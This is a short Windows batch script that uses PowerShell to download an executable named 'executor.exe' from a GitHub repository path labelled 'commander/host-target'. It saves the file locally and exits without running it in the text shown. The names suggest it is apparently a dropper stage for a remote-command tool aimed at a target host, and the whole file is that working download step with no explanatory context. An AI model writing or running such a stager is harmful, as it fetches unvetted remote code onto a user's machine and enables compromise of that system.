@echo off
setlocal

set "url=https://github.com/hng011/commander/raw/refs/heads/main/host-target/dist/executor.exe"
set "file=executor.exe"

powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%file%'"

exit